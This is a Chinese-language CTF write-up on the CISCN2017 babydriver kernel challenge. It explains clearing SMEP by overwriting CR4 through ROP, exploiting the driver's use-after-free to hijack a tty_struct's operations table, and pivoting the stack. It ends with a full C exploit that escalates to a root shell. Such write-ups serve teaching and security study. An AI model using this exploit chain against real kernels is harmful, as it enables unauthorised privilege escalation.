# Kernel ROP ret2usr（2）

## ret2usr with SMEP-BYPASS

前面提到过，当 kernel 开启 SMEP 保护时，ret2usr 这种攻击手法将会引起 kernel panic，因此若是我们仍然想要进行 ret2usr 攻击，则需要先关闭SMEP保护。

在qemu中开始smep是加参数`-cpu kvm64,+smep`

或者在内核中查看`cat /proc/cpuinfo `查看是否有smep信息

### 0x00 原理

Intel 下系统根据 CR4 控制寄存器的第 20 位标识是否开启SMEP保护（1为开启，0为关闭），**若是能够通过kernel ROP改变CR4寄存器的值便能够关闭SMEP保护**，完成SMEP-bypass，接下来就能够重新进行ret2usr。

![](https://pic.imgdb.cn/item/626c0c99239250f7c5d780fb.png)

例如，当

```
$CR4 = 0x1407f0 = 000 1 0100 0000 0111 1111 0000
```

时，smep 保护开启。而 CR4 寄存器是可以通过 mov 指令修改的，因此只需要

```
mov cr4, 0x1407e0
# 0x1407e0 = 101 0 0000 0011 1111 00000
```

即可关闭 smep 保护。

常用的覆盖CR4的值是`0x6F0 == 0000 0000 0110 1111 0000  ` 

### 0x01 例题

>  CISCN2017 - babydriver

~~其实这题更适合当UAF的例题，但是也正好合适bypass smep~~

 #### I. 分析

启动脚本 boot.sh

````bash
#!/bin/bash

qemu-system-x86_64 -initrd rootfs.cpio \
    -kernel bzImage \
    -append 'console=ttyS0 root=/dev/ram oops=panic panic=1' \
    -enable-kvm \
    -monitor /dev/null \
    -m 64M --nographic  \
    -smp cores=1,threads=1 \
    -cpu kvm64,+smep
````

开启了smep保护，没法直接ret2user。但是没有开启Kalsr保护。

init

````sh
#!/bin/sh
 
mount -t proc none /proc
mount -t sysfs none /sys
mount -t devtmpfs devtmpfs /dev
chown root:root flag
chmod 400 flag
exec 0</dev/console
exec 1>/dev/console
exec 2>/dev/console

insmod /lib/modules/4.4.72/babydriver.ko
chmod 777 /dev/babydev
echo -e "\nBoot took $(cut -d' ' -f1 /proc/uptime) seconds\n"
setsid cttyhack setuidgid 1000 sh

umount /proc
umount /sys
poweroff -d 0  -f
````

加载了一个驱动babydriver.ko，另外没有修改kptr_restrict，意味着`/porc/kallsyms`可读。

同时babydriver.ko也只开启了NX保护。

该驱动注册了一个设备babydev

![](https://pic.imgdb.cn/item/626e8f9c239250f7c5fc7c83.png)

command = 0x10001的时候释放了`babydev_struct.device_buf`，我们在IDA中用shift+f9查看结构体

![](https://pic.imgdb.cn/item/626e8f9c239250f7c5fc7c94.png)

同时该结构体定义在bss段上，地址固定

同时存在释放函数`babyrelease()`

![](https://pic.imgdb.cn/item/626e9093239250f7c5ffe252.png)

该函数释放kfree之后没有清空bss段上的结构体，而对于驱动来说是可以多次打开的。

所以这里存在一个UAF漏洞，我们多次open该设备，释放一次之后其他open的操作可以继续使用这个结构体

#### II.利用

由于符号表kallsyms可读，我们可以获得所有函数的地址

接下来我们考虑栈迁移rop改变cr4 寄存器的值以 bypass smep保护

在 `/dev` 下有一个伪终端设备 `ptmx` ，在我们打开这个设备时内核中会创建一个 `tty_struct` 结构体，与其他类型设备相同，tty驱动设备中同样存在着一个存放着函数指针的结构体 `tty_operations`

那么我们不难想到的是我们可以通过 UAF 劫持 `/dev/ptmx` 这个设备的 `tty_struct` 结构体与其内部的 `tty_operations` 函数表，那么在我们对这个设备进行相应操作（如write、ioctl）时便会执行我们布置好的恶意函数指针。

```c
struct tty_struct {
    int magic;
    struct kref kref;
    struct device *dev;
    struct tty_driver *driver;
    const struct tty_operations *ops;  // 《--------这个就是我们要伪造的
    int index;
    /* Protects ldisc changes: Lock tty not pty */
    struct ld_semaphore ldisc_sem;
    struct tty_ldisc *ldisc;
    struct mutex atomic_write_lock;
    struct mutex legacy_mutex;
    struct mutex throttle_mutex;
    struct rw_semaphore termios_rwsem;
    struct mutex winsize_mutex;
    spinlock_t ctrl_lock;
    spinlock_t flow_lock;
    /* Termios values are protected by the termios rwsem */
    struct ktermios termios, termios_locked;
    struct termiox *termiox;    /* May be NULL for unsupported */
    char name[64];
    struct pid *pgrp;       /* Protected by ctrl lock */
    struct pid *session;
    unsigned long flags;
    int count;
    struct winsize winsize;     /* winsize_mutex */
    unsigned long stopped:1,    /* flow_lock */
              flow_stopped:1,
              unused:BITS_PER_LONG - 2;
    int hw_stopped;
    unsigned long ctrl_status:8,    /* ctrl_lock */
              packet:1,
              unused_ctrl:BITS_PER_LONG - 9;
    unsigned int receive_room;  /* Bytes free for queue */
    int flow_change;
    struct tty_struct *link;
    struct fasync_struct *fasync;
    wait_queue_head_t write_wait;
    wait_queue_head_t read_wait;
    struct work_struct hangup_work;
    void *disc_data;
    void *driver_data;
    spinlock_t files_lock;      /* protects tty_files list */
    struct list_head tty_files;
#define N_TTY_BUF_SIZE 4096
    int closing;
    unsigned char *write_buf;
    int write_cnt;
    /* If the tty has a pending do_SAK, queue it here - akpm */
    struct work_struct SAK_work;
    struct tty_port *port;
} __randomize_layout;
```
`tty_struct`一般大小是0x2e

```c
struct tty_operations {
    struct tty_struct * (*lookup)(struct tty_driver *driver,
            struct file *filp, int idx);
    int  (*install)(struct tty_driver *driver, struct tty_struct *tty);
    void (*remove)(struct tty_driver *driver, struct tty_struct *tty);
    int  (*open)(struct tty_struct * tty, struct file * filp);
    void (*close)(struct tty_struct * tty, struct file * filp);
    void (*shutdown)(struct tty_struct *tty);
    void (*cleanup)(struct tty_struct *tty);
    int  (*write)(struct tty_struct * tty,   // 《-----我们要伪造的write指针
              const unsigned char *buf, int count);
    int  (*put_char)(struct tty_struct *tty, unsigned char ch);
    void (*flush_chars)(struct tty_struct *tty);
    int  (*write_room)(struct tty_struct *tty);
    int  (*chars_in_buffer)(struct tty_struct *tty);
    int  (*ioctl)(struct tty_struct *tty,
            unsigned int cmd, unsigned long arg);
    long (*compat_ioctl)(struct tty_struct *tty,
                 unsigned int cmd, unsigned long arg);
    void (*set_termios)(struct tty_struct *tty, struct ktermios * old);
    void (*throttle)(struct tty_struct * tty);
    void (*unthrottle)(struct tty_struct * tty);
    void (*stop)(struct tty_struct *tty);
    void (*start)(struct tty_struct *tty);
    void (*hangup)(struct tty_struct *tty);
    int (*break_ctl)(struct tty_struct *tty, int state);
    void (*flush_buffer)(struct tty_struct *tty);
    void (*set_ldisc)(struct tty_struct *tty);
    void (*wait_until_sent)(struct tty_struct *tty, int timeout);
    void (*send_xchar)(struct tty_struct *tty, char ch);
    int (*tiocmget)(struct tty_struct *tty);
    int (*tiocmset)(struct tty_struct *tty,
            unsigned int set, unsigned int clear);
    int (*resize)(struct tty_struct *tty, struct winsize *ws);
    int (*set_termiox)(struct tty_struct *tty, struct termiox *tnew);
    int (*get_icount)(struct tty_struct *tty,
                struct serial_icounter_struct *icount);
    void (*show_fdinfo)(struct tty_struct *tty, struct seq_file *m);
#ifdef CONFIG_CONSOLE_POLL
    int (*poll_init)(struct tty_driver *driver, int line, char *options);
    int (*poll_get_char)(struct tty_driver *driver, int line);
    void (*poll_put_char)(struct tty_driver *driver, int line, char ch);
#endif
    int (*proc_show)(struct seq_file *, void *);
} __randomize_layout;
```

这么多指针，简直就是pwn手的风水宝地。

我们在用户态进程的栈上布置ROP链与`fake tty_operations`结构体

同时经过调试发现，在我们调用`tty_operations->write`时，**其rax寄存器中存放的便是tty_operations结构体的地址**，因此若是我们能够在内核中找到形如`mov rsp, rax`的gadget，便能够成功地将栈迁移到`tty_operations`结构体的开头。

> 这题的vmlinux我用ropper都找不到下面这个gadget，非常奇怪，最后还是用的ROPgadget

找到一个好用的gadget

```
0xffffffff8181bfc5 : mov rsp, rax ; dec ebx ; jmp 0xffffffff8181bf7e
```

调试发现该gadget等价于

```
mov rsp, rax ; dec ebx ; ret
```

那么利用这条gadget我们便可以很好地完成栈迁移的过程，执行我们所构造的ROP链

而`tty_operations`结构体开头到其write指针间的空间较小，因此我们还需要进行二次栈迁移，这里随便选一条改rax的gadget即可.

```
0xffffffff8100ce6e: pop rax; ret; 
```

以及修改cr4寄存器的gadget

```
0xffffffff81004d80: mov cr4, rdi; pop rbp; ret;
```

#### III. Exploit

````c
//  musl-gcc ./exp.c --static -masm='intel' -o ./exploit

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/types.h>

#define MOV_CR4_RDI_POP_RBP 0xffffffff81004d80;
#define MOV_RSP_RAX 0xffffffff8181bfc5;
#define POP_RAX 0xffffffff8100ce6e;
#define POP_RDI 0xffffffff810d238d;
#define SWAPGS_POP_RBP 0xffffffff81063694;
#define IRETQ 0xffffffff814e35ef;
#define MOV_RSP_RAX_DEC_EBX 0xffffffff8181bfc5;

// commit_creds(prepare_kernel_cred(NULL))

size_t commit_creds = NULL;
size_t prepare_kernel_cred = NULL;
size_t user_cs,user_ss,user_rflags,user_sp;
void* fake_tty_operations[30];
// size_t vmlinux_base = 0;
void saveStatus()
{
    __asm__("mov user_cs, cs;"
            "mov user_ss, ss;"
            "mov user_sp, rsp;"
            "pushf;"
            "pop user_rflags;"
            );
    printf("[*] Status has been saved.\n");
}

void root(){
    char* (*pkc)(int) = prepare_kernel_cred;
    void (*cc)(char*) = commit_creds;
    (*cc)((*pkc)(0));
}


void get_shell(){
    if(!getuid()){
        printf("ROOT NOW!");
        system("/bin/sh");
    }else{
        printf("NO ROOT");
        exit(-1);
    }
}

void dev_alloc(int fd,size_t size){
    ioctl(fd,0x10001,size);
}

int main(){
    saveStatus();

    FILE * sys_table_fd = fopen("/proc/kallsyms","r");
    if(sys_table_fd < 0){
        printf("[*]cannot open '/proc/kallsyms' \n");
        exit(-1);
    }
    printf("[*]Open '/proc/kallsyms' ....\n");
    char buf[0x50]={0};
    while(fgets(buf,0x50,sys_table_fd)){
        if(commit_creds & prepare_kernel_cred)
            break;
        if(strstr(buf,"commit_creds") && !commit_creds){
            char hex[20]={0};
            strncpy(hex,buf,16);
            sscanf(hex,"%llx",&commit_creds);
            printf("[*]commit_creds addr: %p\n", commit_creds);
        }
        if(strstr(buf,"prepare_kernel_cred") && !prepare_kernel_cred){
            char hex[20]={0};
            strncpy(hex,buf,16);
            sscanf(hex,"%llx",&prepare_kernel_cred);
            printf("[*]prepare_kernel_cred addr: %p\n", prepare_kernel_cred);
        }
    }
    int i=0;
    size_t rop[0x30]={0};
    rop[i++] = POP_RDI;
    rop[i++] = 0x6F0;
    rop[i++] = MOV_CR4_RDI_POP_RBP;
    rop[i++] = 0; //rbp=0
    rop[i++] = (size_t)root;
    rop[i++] = SWAPGS_POP_RBP;
    rop[i++] = 0; //rbp=0 
    rop[i++] = IRETQ;
    rop[i++] = get_shell;
    rop[i++] = user_cs;
    rop[i++] = user_rflags;
    rop[i++] = user_sp;
    rop[i++] = user_ss;

    for(i=0;i<30;i++){
        fake_tty_operations[i] = MOV_RSP_RAX_DEC_EBX; // write -> rax = tty_operations_addr
    }
    fake_tty_operations[0] = POP_RAX;
    fake_tty_operations[1] = rop; //rax==rop
    // fake_tty_operations[2-29] = MOV_RSP_RAX_DEC_EBX;


    int fd1 = open("/dev/babydev",2);
    int fd2 = open("/dev/babydev",2);

    dev_alloc(fd1,0x2e0); //tty_struct
    close(fd1);

    size_t fake_tty_struct[4] = {0};

    int fd_tty = open("/dev/ptmx", O_RDWR|O_NOCTTY);
    read(fd2, fake_tty_struct, 32); //save real tty_struct (for magic and more..)
    fake_tty_struct[3] = (size_t)fake_tty_operations; // real_tty_op --> fake_tty_op
    write(fd2,fake_tty_struct, 32); // write back

    char bufs[0x8]={0};
    write(fd_tty, bufs, 8); //write --> rop

    return 0;
}
````

最后提权成功

![](https://pic.imgdb.cn/item/626fbf03239250f7c556ed49.png)

